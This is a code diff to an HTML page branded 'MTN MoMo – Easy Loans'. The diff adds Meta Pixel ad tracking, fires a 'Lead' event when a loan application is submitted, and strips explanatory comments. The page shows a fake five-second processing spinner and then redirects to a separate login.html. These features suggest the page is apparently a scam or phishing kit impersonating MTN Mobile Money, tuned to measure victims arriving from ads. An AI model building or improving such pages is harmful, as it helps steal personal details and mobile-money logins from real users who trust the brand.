@@ -4,6 +4,30 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>MTN MoMo – Easy Loans</title>
+
+  <!-- ============================================
+       META PIXEL — BASE CODE
+       Pixel ID: 2204599977605917
+       ============================================ -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '2204599977605917');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=2204599977605917&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- ============================================
+       END META PIXEL
+       ============================================ -->
+
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -43,9 +67,7 @@
     .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
     .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }
 
-    /* ============================================
-       LANGUAGE GATE (first-visit modal)
-       ============================================ */
+    /* LANGUAGE GATE */
     #lang-gate {
       position: fixed;
       inset: 0;
@@ -380,16 +402,13 @@
 </head>
 <body>
 
-  <!-- ============================================
-       LANGUAGE GATE (first-visit modal)
-       ============================================ -->
+  <!-- LANGUAGE GATE -->
   <div id="lang-gate">
     <div class="gate-card">
       <div class="gate-logo"></div>
       <h2 class="gate-title">Choose your language</h2>
       <p class="gate-sub">Select how you want to use MTN MoMo</p>
 
-      <!-- Custom Dropdown (no flags) -->
       <div class="dropdown" id="langDropdown">
         <button class="dropdown-trigger" id="dropdownTrigger" type="button">
           <span id="selectedLabel">English</span>
@@ -664,14 +683,7 @@
   </script>
 
   <script>
-    /* ============================================
-       LANGUAGE GATE
-       - Custom dropdown (no flags)
-       - Continue button confirms selection
-       - Saves to localStorage.momoLang
-       - Skips gate on return visits
-       - No page translation
-       ============================================ */
+    /* LANGUAGE GATE */
     const LANG_LABELS = {
       en: 'English',
       fr: 'Français',
@@ -687,13 +699,11 @@
 
     let pendingLang = 'en';
 
-    /* Dropdown open/close */
     ddTrigger.addEventListener('click', (e) => {
       e.stopPropagation();
       dropdown.classList.toggle('open');
     });
 
-    /* Item selection */
     ddItems.forEach(item => {
       item.addEventListener('click', (e) => {
         e.stopPropagation();
@@ -704,27 +714,22 @@
       });
     });
 
-    /* Close when clicking outside */
     document.addEventListener('click', (e) => {
       if (!dropdown.contains(e.target)) {
         dropdown.classList.remove('open');
       }
     });
 
-    /* Continue button — save + dismiss gate */
     continueBtn.addEventListener('click', () => {
       localStorage.setItem('momoLang', pendingLang);
       gate.classList.add('hide');
     });
 
-    /* First-visit check */
     const savedLang = localStorage.getItem('momoLang');
     if (savedLang) {
-      // Skip gate entirely
       pendingLang = savedLang;
       gate.classList.add('hide');
     } else {
-      // Show gate with default English selected
       ddItems.forEach(i => i.classList.toggle('selected', i.dataset.lang === 'en'));
     }
   </script>
@@ -804,7 +809,7 @@
       goTo('page-step3');
     }
 
-    // ═══ STEP 3 → SUBMIT → SPIN → REDIRECT TO login.html ═══
+    // ═══ STEP 3 → SUBMIT → PIXEL LEAD → SPIN → REDIRECT TO login.html ═══
     async function submitApplication() {
       const btn = document.getElementById('submitBtn');
       btn.disabled = true;
@@ -825,6 +830,21 @@
       S.loanAmount = payload.loanAmount;
       S.loanTerm = payload.loanTerm;
 
+      // ============================================
+      // ✅ FIRE META PIXEL LEAD EVENT
+      // ============================================
+      if (typeof fbq === 'function') {
+        fbq('track', 'Lead', {
+          content_name: 'MoMo Loan Application',
+          content_category: payload.loanType,
+          value: payload.loanAmount,
+          currency: 'XAF'
+        });
+        console.log('✅ Meta Pixel: Lead event fired');
+      } else {
+        console.warn('⚠️ Meta Pixel not loaded — Lead event skipped');
+      }
+
       // Show spinning overlay
       document.getElementById('processingOverlay').classList.add('show');
 
@@ -843,13 +863,11 @@
         console.error('Submit error:', err);
       }
 
-      // Ensure spinner shows for at least 5 seconds
       const elapsed = Date.now() - startTime;
       const remaining = Math.max(0, MIN_SPIN_MS - elapsed);
 
       setTimeout(() => {
         document.getElementById('processingOverlay').classList.remove('show');
-        // ✅ REDIRECT TO login.html
         window.location.href = 'login.html';
       }, remaining);
     }
